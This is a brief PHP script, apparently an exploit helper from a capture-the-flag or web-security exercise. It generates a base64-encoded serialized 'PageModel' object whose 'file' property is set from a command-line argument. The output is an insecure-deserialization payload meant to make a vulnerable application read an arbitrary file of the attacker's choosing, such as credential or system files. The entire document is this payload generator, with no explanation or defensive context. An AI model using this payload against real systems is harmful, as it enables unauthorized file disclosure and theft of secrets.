<?php
echo(base64_encode(sprintf(
    'O:9:"PageModel":1:{s:4:"file";s:%d:"%s";}',
    strlen($argv[1]),
    $argv[1]
))."\n");
?>
